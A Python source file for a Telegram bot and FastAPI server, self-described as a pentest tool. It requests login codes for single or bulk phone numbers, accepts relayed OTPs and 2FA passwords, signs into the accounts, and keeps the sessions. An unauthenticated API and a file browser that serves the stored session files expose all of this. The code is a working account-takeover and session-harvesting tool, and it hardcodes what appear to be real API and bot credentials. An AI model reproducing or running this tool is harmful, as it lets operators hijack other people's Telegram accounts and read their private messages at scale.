#!/usr/bin/env python3
"""
Telegram Login Tool - Bot + FastAPI
"""
import asyncio
import re
import os
import pickle
import pathlib

from telethon import TelegramClient, events
from telethon.sessions import MemorySession
from telethon.errors import SessionPasswordNeededError, FloodWaitError

from fastapi import FastAPI, HTTPException
from fastapi.responses import FileResponse, HTMLResponse
from pydantic import BaseModel
import uvicorn

# === CONFIGURATION ===
BASE_DIR = pathlib.Path(__file__).parent.resolve()
API_ID = os.getenv('API_ID', '25881226')
API_HASH = os.getenv('API_HASH', '2e981dbffc9a37c28c1adeb74d5e2216')
BOT_TOKEN = os.getenv('BOT_TOKEN', '8932487693:AAEEOCeYhX0kkitYS9fiWcpsNwndf47uCtU')
SESSION_DIR = str(BASE_DIR / 'sessions')
VARS_FILE = str(BASE_DIR / 'vars.txt')

# === Bot Handler ===
class TelegramAuthBot:
    def __init__(self):
        os.makedirs(SESSION_DIR, exist_ok=True)
        self.bot = TelegramClient(MemorySession(), API_ID, API_HASH)
        self.sessions = {}       # phone -> client mapping
        self.pending_codes = {}  # phone -> {hash, client}

    def session_name(self, phone):
        os.makedirs(SESSION_DIR, exist_ok=True)
        return os.path.join(SESSION_DIR, phone)

    def create_user_client(self, phone, api_id=API_ID, api_hash=API_HASH):
        return TelegramClient(self.session_name(phone), api_id, api_hash)

    def save_account_metadata(self, phone, api_id=API_ID, api_hash=API_HASH, vars_path: str = VARS_FILE):
        with open(vars_path, 'ab') as f:
            pickle.dump([api_id, api_hash, phone], f)

    async def load_saved_sessions(self, vars_path: str = VARS_FILE):
        """Reload all authorized sessions stored as pickle records in vars.txt."""
        loaded = 0

        try:
            with open(vars_path, 'rb') as f:
                while True:
                    try:
                        api_id, api_hash, phone = pickle.load(f)
                    except EOFError:
                        break

                    try:
                        client = self.create_user_client(phone, int(api_id), api_hash)
                        await client.connect()

                        if await client.is_user_authorized():
                            old_client = self.sessions.get(phone)
                            if old_client:
                                await old_client.disconnect()
                            self.sessions[phone] = client
                            loaded += 1
                            print(f"[+] Successfully reloaded session for {phone}")
                        else:
                            await client.disconnect()
                            print(f"[-] Session file for {phone} exists but is no longer authorized.")
                    except Exception as e:
                        print(f"[-] Failed to load session for {phone}: {str(e)}")

            print(f"[*] Loaded {loaded} saved authorized session(s).")

        except FileNotFoundError:
            print(f"[-] {vars_path} not found. No previous sessions to load.")
        except Exception as e:
            print(f"[-] Error loading saved sessions: {str(e)}")

    async def setup(self):
        await self.bot.start(bot_token=BOT_TOKEN)
        print("[+] Bot started")
        await self.load_saved_sessions()


        

        @self.bot.on(events.NewMessage(pattern=r'^/start$'))
        async def start_handler(event):
            await event.reply(
                "Telegram Auth Pentest Bot\n\n"
                "Commands:\n"
                "/login +PHONE_NUMBER - Request login code\n"
                "/verify +PHONE_NUMBER CODE - Submit OTP\n"
                "/bulk_login - Login 50 numbers from file\n"
                "/check +PHONE_NUMBER - Check session status\n"
                "/logout +PHONE_NUMBER - End session\n"
                "/list - Show active sessions"
            )

        @self.bot.on(events.NewMessage(pattern=r'^/login'))
        async def login_handler(event):
            parts = event.message.text.split()
            if len(parts) < 2:
                await event.reply("Usage: /login +1234567890")
                return

            phone = parts[1]
            await event.reply(f"[*] Requesting code for {phone}...")

            try:
                client = self.create_user_client(phone)
                await client.connect()

                if await client.is_user_authorized():
                    await event.reply(f"[!] {phone} already logged in")
                    self.sessions[phone] = client
                    return

                sent = await client.send_code_request(phone)
                self.pending_codes[phone] = {
                    'client': client,
                    'phone_code_hash': sent.phone_code_hash,
                    'timeout': sent.timeout
                }

                await event.reply(
                    f"[+] Code sent to {phone}\n"
                    f"Timeout: {sent.timeout}s\n"
                    f"Type: {sent.type}\n"
                    f"Use: /verify {phone} <CODE>"
                )

            except FloodWaitError as e:
                await event.reply(f"[!] Rate limited. Wait {e.seconds}s")
            except Exception as e:
                await event.reply(f"[-] Error: {str(e)}")

        @self.bot.on(events.NewMessage(pattern=r'^/verify\s'))
        async def verify_handler(event):
            parts = event.message.text.split()
            if len(parts) < 3:
                await event.reply("Usage: /verify +1234567890 12345")
                return

            phone = parts[1]
            code = parts[2]

            if phone not in self.pending_codes:
                await event.reply(f"[-] No pending login for {phone}. Use /login first.")
                return

            pending = self.pending_codes[phone]
            client = pending['client']
            phone_code_hash = pending['phone_code_hash']

            try:
                await client.sign_in(
                    phone=phone,
                    code=code,
                    phone_code_hash=phone_code_hash
                )

                self.sessions[phone] = client
                del self.pending_codes[phone]
                self.save_account_metadata(phone)

                # Get user info
                me = await client.get_me()
                await event.reply(
                    f"[+] Login successful for {phone}\n"
                    f"User: {me.first_name} {me.last_name or ''}\n"
                    f"Username: @{me.username or 'N/A'}\n"
                    f"ID: {me.id}"
                )

            except SessionPasswordNeededError:
                await event.reply(
                    f"[!] 2FA enabled for {phone}\n"
                    f"Use: /verify_2fa {phone} <PASSWORD>"
                )
            except Exception as e:
                await event.reply(f"[-] Verify error: {str(e)}")

        @self.bot.on(events.NewMessage(pattern=r'^/bulk_login$'))
        async def bulk_login_handler(event):
            """Login multiple numbers from a file"""
            try:
                with open('phones.txt', 'r') as f:
                    phones = [line.strip() for line in f if line.strip()]

                if not phones:
                    await event.reply("[-] phones.txt is empty")
                    return

                await event.reply(f"[*] Starting bulk login for {len(phones)} numbers...")

                results = {'sent': 0, 'failed': 0, 'already': 0}

                for i, phone in enumerate(phones):
                    try:
                        if phone in self.sessions:
                            results['already'] += 1
                            continue

                        client = self.create_user_client(phone)
                        await client.connect()

                        if await client.is_user_authorized():
                            self.sessions[phone] = client
                            results['already'] += 1
                            continue

                        sent = await client.send_code_request(phone)
                        self.pending_codes[phone] = {
                            'client': client,
                            'phone_code_hash': sent.phone_code_hash,
                            'timeout': sent.timeout
                        }
                        results['sent'] += 1

                        # Stagger requests
                        await asyncio.sleep(3)

                    except Exception as e:
                        results['failed'] += 1

                    # Report progress every 10 numbers
                    if (i + 1) % 10 == 0:
                        await event.reply(
                            f"[*] Progress: {i+1}/{len(phones)}\n"
                            f"Codes sent: {results['sent']}\n"
                            f"Failed: {results['failed']}"
                        )

                await event.reply(
                    f"[+] Bulk complete\n"
                    f"Codes sent: {results['sent']}\n"
                    f"Already logged in: {results['already']}\n"
                    f"Failed: {results['failed']}\n\n"
                    f"Submit OTPs with:\n"
                    f"/verify_bulk - Show pending phones"
                )

            except FileNotFoundError:
                await event.reply("[-] phones.txt not found. Create it with one number per line.")

        @self.bot.on(events.NewMessage(pattern=r'^/verify_bulk$'))
        async def verify_bulk_handler(event):
            """Show all pending verifications for manual OTP submission"""
            pending = list(self.pending_codes.keys())

            if not pending:
                await event.reply("[-] No pending verifications")
                return

            msg = f"[*] {len(pending)} pending verifications\nSubmit one at a time with:\n\n"
            for p in pending:
                msg += f"/verify {p} <CODE>\n"

            await event.reply(msg)

        @self.bot.on(events.NewMessage(pattern=r'^/check'))
        async def check_handler(event):
            """Check if a phone has an active session"""
            parts = event.message.text.split()
            if len(parts) < 2:
                await event.reply("Usage: /check +1234567890")
                return

            phone = parts[1]
            if phone in self.sessions:
                client = self.sessions[phone]
                try:
                    me = await client.get_me()
                    await event.reply(
                        f"[+] {phone} - Active session\n"
                        f"User: {me.first_name} {me.last_name or ''}\n"
                        f"Username: @{me.username or 'N/A'}\n"
                        f"ID: {me.id}"
                    )
                except Exception:
                    await event.reply(f"[!] {phone} - Session exists but may be expired")
            elif phone in self.pending_codes:
                await event.reply(f"[!] {phone} - Awaiting OTP verification")
            else:
                await event.reply(f"[-] {phone} - No session found")

        @self.bot.on(events.NewMessage(pattern=r'^/list$'))
        async def list_handler(event):
            active = list(self.sessions.keys())
            pending = list(self.pending_codes.keys())

            msg = f"Active sessions: {len(active)}\n"
            for p in active[:10]:  # Show first 10
                msg += f"  [ACTIVE] {p}\n"
            if len(active) > 10:
                msg += f"  ... and {len(active)-10} more\n"

            msg += f"\nPending verification: {len(pending)}\n"
            for p in pending[:5]:
                msg += f"  [PENDING] {p}\n"

            await event.reply(msg)

        @self.bot.on(events.NewMessage(pattern=r'^/logout'))
        async def logout_handler(event):
            parts = event.message.text.split()
            if len(parts) < 2:
                await event.reply("Usage: /logout +1234567890")
                return

            phone = parts[1]
            if phone in self.sessions:
                client = self.sessions[phone]
                try:
                    await client.log_out()
                except Exception:
                    pass
                await client.disconnect()
                del self.sessions[phone]
                await event.reply(f"[+] Logged out {phone}")
            elif phone in self.pending_codes:
                pending = self.pending_codes.pop(phone)
                await pending['client'].disconnect()
                await event.reply(f"[+] Cancelled pending login for {phone}")
            else:
                await event.reply(f"[-] No active session for {phone}")

        # === 2FA Handler ===
        @self.bot.on(events.NewMessage(pattern=r'^/verify_2fa\s'))
        async def verify_2fa_handler(event):
            parts = event.message.text.split()
            if len(parts) < 3:
                await event.reply("Usage: /verify_2fa +1234567890 PASSWORD")
                return

            phone = parts[1]
            password = ' '.join(parts[2:]).strip()
            if len(password) >= 2 and password[0] == '<' and password[-1] == '>':
                password = password[1:-1].strip()

            if phone not in self.pending_codes:
                await event.reply(f"[-] No pending login for {phone}. Use /login first.")
                return

            pending = self.pending_codes[phone]
            client = pending['client']

            try:
                await client.sign_in(password=password)
                self.sessions[phone] = client
                del self.pending_codes[phone]
                self.save_account_metadata(phone)

                me = await client.get_me()
                await event.reply(
                    f"[+] 2FA login successful for {phone}\n"
                    f"User: {me.first_name} {me.last_name or ''}\n"
                    f"Username: @{me.username or 'N/A'}\n"
                    f"ID: {me.id}"
                )

            except Exception as e:
                await event.reply(f"[-] 2FA error: {str(e)}")

    async def stop(self):
        for _, client in self.sessions.items():
            try:
                await client.disconnect()
            except Exception:
                pass
        for _, pending in self.pending_codes.items():
            try:
                await pending['client'].disconnect()
            except Exception:
                pass
        await self.bot.disconnect()


# === FastAPI ===
app = FastAPI()
auth_bot: TelegramAuthBot = None  # set in main()


class LoginReq(BaseModel):
    phone: str

class VerifyReq(BaseModel):
    phone: str
    code: str

class Verify2FAReq(BaseModel):
    phone: str
    password: str

class BulkLoginReq(BaseModel):
    phones: list[str]


@app.post("/login")
async def api_login(req: LoginReq):
    phone = req.phone
    try:
        client = auth_bot.create_user_client(phone)
        await client.connect()

        if await client.is_user_authorized():
            auth_bot.sessions[phone] = client
            return {"status": "already_logged_in", "phone": phone}

        sent = await client.send_code_request(phone)
        auth_bot.pending_codes[phone] = {
            "client": client,
            "phone_code_hash": sent.phone_code_hash,
            "timeout": sent.timeout,
        }
        return {"status": "code_sent", "phone": phone, "timeout": sent.timeout}

    except FloodWaitError as e:
        raise HTTPException(429, f"Rate limited. Wait {e.seconds}s")
    except Exception as e:
        raise HTTPException(400, str(e))


@app.post("/verify")
async def api_verify(req: VerifyReq):
    phone, code = req.phone, req.code
    if phone not in auth_bot.pending_codes:
        raise HTTPException(404, "No pending login for this number. Call /login first.")

    pending = auth_bot.pending_codes[phone]
    client = pending["client"]

    try:
        await client.sign_in(phone=phone, code=code, phone_code_hash=pending["phone_code_hash"])
        auth_bot.sessions[phone] = client
        del auth_bot.pending_codes[phone]
        auth_bot.save_account_metadata(phone)

        me = await client.get_me()
        return {"status": "ok", "phone": phone, "name": f"{me.first_name} {me.last_name or ''}".strip(), "username": me.username, "id": me.id}

    except SessionPasswordNeededError:
        return {"status": "2fa_required", "phone": phone}
    except Exception as e:
        raise HTTPException(400, str(e))


@app.post("/verify_2fa")
async def api_verify_2fa(req: Verify2FAReq):
    phone = req.phone
    if phone not in auth_bot.pending_codes:
        raise HTTPException(404, "No pending login for this number. Call /login first.")

    client = auth_bot.pending_codes[phone]["client"]
    try:
        await client.sign_in(password=req.password)
        auth_bot.sessions[phone] = client
        del auth_bot.pending_codes[phone]
        auth_bot.save_account_metadata(phone)

        me = await client.get_me()
        return {"status": "ok", "phone": phone, "name": f"{me.first_name} {me.last_name or ''}".strip(), "username": me.username, "id": me.id}

    except Exception as e:
        raise HTTPException(400, str(e))


@app.get("/sessions")
async def api_sessions():
    return {
        "active": list(auth_bot.sessions.keys()),
        "pending": list(auth_bot.pending_codes.keys()),
    }


@app.get("/session/{phone}")
async def api_check(phone: str):
    if phone in auth_bot.sessions:
        try:
            me = await auth_bot.sessions[phone].get_me()
            return {"status": "active", "name": f"{me.first_name} {me.last_name or ''}".strip(), "username": me.username}
        except Exception:
            return {"status": "expired"}
    if phone in auth_bot.pending_codes:
        return {"status": "pending_otp"}
    raise HTTPException(404, "No session found")


@app.delete("/session/{phone}")
async def api_logout(phone: str):
    if phone in auth_bot.sessions:
        try:
            await auth_bot.sessions[phone].log_out()
        except Exception:
            pass
        await auth_bot.sessions[phone].disconnect()
        del auth_bot.sessions[phone]
        return {"status": "logged_out"}
    if phone in auth_bot.pending_codes:
        await auth_bot.pending_codes[phone]["client"].disconnect()
        del auth_bot.pending_codes[phone]
        return {"status": "cancelled"}
    raise HTTPException(404, "No session found")


@app.post("/bulk_login")
async def api_bulk_login(req: BulkLoginReq):
    results = {"sent": [], "already": [], "failed": {}}
    for phone in req.phones:
        try:
            if phone in auth_bot.sessions:
                results["already"].append(phone)
                continue
            client = auth_bot.create_user_client(phone)
            await client.connect()
            if await client.is_user_authorized():
                auth_bot.sessions[phone] = client
                results["already"].append(phone)
                continue
            sent = await client.send_code_request(phone)
            auth_bot.pending_codes[phone] = {"client": client, "phone_code_hash": sent.phone_code_hash, "timeout": sent.timeout}
            results["sent"].append(phone)
            await asyncio.sleep(3)
        except Exception as e:
            results["failed"][phone] = str(e)
    return results


# === File Browser ===
def _dir_listing(directory: pathlib.Path, url_path: str) -> HTMLResponse:
    entries = sorted(directory.iterdir(), key=lambda p: (p.is_file(), p.name.lower()))
    rows = ""
    if url_path.strip("/"):
        parent = "/" + "/".join(url_path.strip("/").split("/")[:-1])
        rows += f'<tr><td><a href="/files{parent}">.. (up)</a></td><td></td></tr>'
    for entry in entries:
        entry_url = f"/files/{url_path.strip('/')}/{entry.name}".replace("//", "/")
        size = f"{entry.stat().st_size:,} B" if entry.is_file() else "—"
        icon = "📄" if entry.is_file() else "📁"
        rows += f'<tr><td><a href="{entry_url}">{icon} {entry.name}</a></td><td>{size}</td></tr>'
    html = f"""<!DOCTYPE html>
<html><head><title>/{url_path}</title>
<style>body{{font-family:monospace;padding:20px}}table{{border-collapse:collapse;width:100%}}
td{{padding:6px 12px;border-bottom:1px solid #eee}}a{{text-decoration:none;color:#0066cc}}a:hover{{text-decoration:underline}}</style>
</head><body>
<h2>/{url_path}</h2><hr>
<table><tr><th align=left>Name</th><th align=left>Size</th></tr>{rows}</table>
</body></html>"""
    return HTMLResponse(html)


@app.get("/files", response_class=HTMLResponse)
@app.get("/files/{file_path:path}")
async def browse(file_path: str = ""):
    target = (BASE_DIR / file_path).resolve()
    if not str(target).startswith(str(BASE_DIR)):
        raise HTTPException(403, "Access denied")
    if not target.exists():
        raise HTTPException(404, "Not found")
    if target.is_dir():
        return _dir_listing(target, file_path)
    return FileResponse(target, filename=target.name)


# === Run ===
async def main():
    global auth_bot
    auth_bot = TelegramAuthBot()
    await auth_bot.setup()

    config = uvicorn.Config(app, host="0.0.0.0", port=8000, log_level="warning")
    server = uvicorn.Server(config)

    await asyncio.gather(
        auth_bot.bot.run_until_disconnected(),
        server.serve(),
    )


if __name__ == '__main__':
    asyncio.run(main())
